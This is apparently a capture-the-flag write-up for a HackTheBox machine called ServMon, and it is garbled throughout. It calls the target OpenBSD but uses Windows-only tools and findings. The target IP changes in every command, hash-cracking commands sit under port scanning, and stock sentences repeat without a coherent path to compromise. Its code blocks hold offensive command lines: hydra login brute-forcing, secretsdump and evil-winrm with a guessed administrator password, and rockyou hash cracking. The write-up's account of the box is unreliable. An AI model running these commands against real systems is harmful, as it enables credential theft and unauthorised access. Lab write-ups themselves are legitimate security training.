---
TitleSEO: "HackTheBox — ServMon (Hard OpenBSD) | ZureFX"
TitlePost: "HackTheBox — ServMon (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox ServMon. AlwaysInstallElevated and CORS Misconfiguration to achieve hard compromise on OpenBSD."
Keywords: "easy, medium, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-servmon-516.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-servmon-516/"
Date: "2025-04-06"
Tags: "Easy, Medium, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-servmon-516"
Permalink: "/writeups/htb-servmon-516.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **ServMon** is rated **Hard** on HackTheBox. It runs **OpenBSD** and the IP address during this analysis was `10.23.205.73`.

### Objectives

Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p139,3268,3306 10.93.202.115 -oN scan.txt
crackmapexec smb 10.110.30.111 -u administrator -p 'P@ssw0rd!' --shares
```

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service. The backup files contained sensitive information that should not have been accessible.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.18.202.85/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.24.223.72 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p5432,8443,636 10.126.248.22 -oN scan.txt
evil-winrm -i 10.33.64.37 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

### SMB Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

```bash
nmap -sCV -p3306,5985,27017 10.118.107.100 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.72.184.60 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file.

## Exploitation

### Vulnerability Identification

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **AlwaysInstallElevated**.

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.40.96.170
gobuster dir -u http://10.30.208.25/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
nmap -sCV -p139,443,1433 10.22.102.44 -oN scan.txt
```

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.118.98.48 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
evil-winrm -i 10.46.242.179 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.116.174.47/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

```powershell
nmap -sCV -p443,23,389 10.99.78.247 -oN scan.txt
evil-winrm -i 10.96.83.214 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p443,3268,110 10.58.70.226 -oN scan.txt
gobuster dir -u http://10.115.79.126/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Summary

### Tools Used

- `metasploit`
- `msfvenom`
- `hydra`
- `sharphound`
- `secretsdump`

### Key Takeaways

- AlwaysInstallElevated
- CORS Misconfiguration
- DNS Rebinding
